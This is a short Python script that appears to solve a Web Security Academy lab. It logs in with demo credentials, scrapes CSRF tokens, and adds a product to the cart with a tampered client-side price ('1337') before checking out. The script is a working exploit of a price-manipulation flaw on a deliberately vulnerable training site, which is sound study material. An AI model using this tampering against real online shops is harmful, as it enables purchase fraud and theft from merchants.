import requests
import re


# Disable certificate warning
requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

url = "https://0a7f005004976af1807c4e3300ad00c5.web-security-academy.net/"  #change to lab URL
username = "wiener"
password = "peter"

login_session = requests.session()
login_url = url + "login"
r = login_session.get(login_url,verify=False)
match = re.search(r'name="csrf" value="(.+)">',r.text)
login_csrf_token = match.group(1)
print(f"login csrf token in {login_csrf_token}")

login_data = {"csrf":login_csrf_token,"username":username,"password":password}
r = login_session.post(login_url,verify=False,data=login_data)
print("login success")

cart_data = {"productId":"1","redir":"PRODUCT","quantity":"1","price":"1337"}
r = login_session.post(url+"cart",verify=False,data=cart_data)
r = login_session.get(url+"cart",verify=False)
match = re.search(r'name="csrf" value="(.+)">',r.text)
checkout_csrf = match.group(1)
print(f"checkout csrf token in {checkout_csrf}")
checkout_data = {"csrf":checkout_csrf}
r = login_session.post(url+"cart/checkout",verify=False,data=checkout_data)
print(r.text)